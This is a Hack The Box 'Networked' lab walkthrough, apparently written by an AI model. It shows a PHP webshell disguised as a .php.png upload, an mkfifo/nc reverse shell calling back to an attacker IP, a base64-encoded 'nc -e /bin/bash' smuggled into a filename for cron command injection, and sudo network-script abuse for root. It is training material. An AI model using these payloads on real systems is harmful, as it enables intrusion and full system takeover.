# 🧠 HTB: Networked

## 📦 Box Info
- **OS**: Linux (CentOS 7)
- **Difficulty**: Easy
- **Vector**: Web Upload → Cron Command Injection → Network Script Abuse

---

## 🔍 Recon

### Nmap

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.146
nmap -p 80,22,443 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.146
```

- **Ports open**:
  - [22](SSH) → OpenSSH 7.4
  - [80](HTTP) → Apache 2.4.6 (PHP 5.4.16)
  - 443 → Closed

---

## 🌐 Web Enumeration

### Gobuster / Dirsearch

```bash
dirsearch -u http://10.10.10.146
```

Found:
- `/upload.php`
- `/uploads/`
- `/backup/`
- `/index.php`
- `/backup/backup.tar` → Contains source code

---

## 🔬 Source Code Analysis (from `backup.tar`)

### Key Points from `upload.php` & `lib.php`:
- Only allows `.jpg`, `.png`, `.gif`, `.jpeg`
- Uses `check_file_type()` to validate MIME
- Uses `getnameUpload()` to extract extension after first `.`
- The server treats `something.php.png` as executable PHP due to Apache misconfig:

```apacheconf
AddHandler php5-script .php
```

---

## 💥 Exploitation: Webshell as Apache

### 🐚 Create Malicious File

Append PHP to an image:
```bash
echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
mv shell.png shell.php.png
```

### 🐱 Upload Webshell

Go to:
```
http://10.10.10.146/upload.php
```

### 🐚 Reverse Shell Payload

Start listener:
```bash
nc -lnvp 443
```

Trigger reverse shell:
```
http://10.10.10.146/uploads/10_10_14_5.php.png?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f
```

Shell as:
```bash
id
uid=48(apache) gid=48(apache)
```

---

## 🔼 PrivEsc: Apache → Guly

### 🧹 Exploit `check_attack.php` via Cron

File:
```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

Exploit with a filename:
```bash
touch "/var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b"
```

(Decoded: `nc -e /bin/bash 10.10.14.7 443`)

### 🧠 Wait for Cron

Listener:
```bash
nc -lnvp 443
```

Shell as:
```bash
id
uid=1000(guly) gid=1000(guly)
```

✅ Grab `user.txt`

---

## 🔼 PrivEsc: Guly → Root

### 🔧 Sudo Permission

```bash
sudo -l
```

Allowed:
```
/usr/local/sbin/changename.sh
```

Script writes a config and calls `ifup`:

```bash
echo "interface PROXY_METHOD:" ; read x
echo $x >> /etc/sysconfig/network-scripts/ifcfg-guly
```

If input includes a space, code after it is executed.

### 💥 Exploit

```bash
sudo /usr/local/sbin/changename.sh
```

Inputs:
```
NAME: test
PROXY_METHOD: a /bin/bash
BROWSER_ONLY: b
BOOTPROTO: c
```

Root shell:
```bash
id
uid=0(root) gid=0(root)
```

✅ Grab `root.txt`

---

## 🔎 Beyond Root: Apache Misconfig

```apacheconf
AddHandler php5-script .php
```

🛑 This causes `.php.*` to be interpreted as PHP.

---

Let me know if you want a downloadable version (PDF/Markdown) or want this organized for a Notion/Obsidian vault ⚡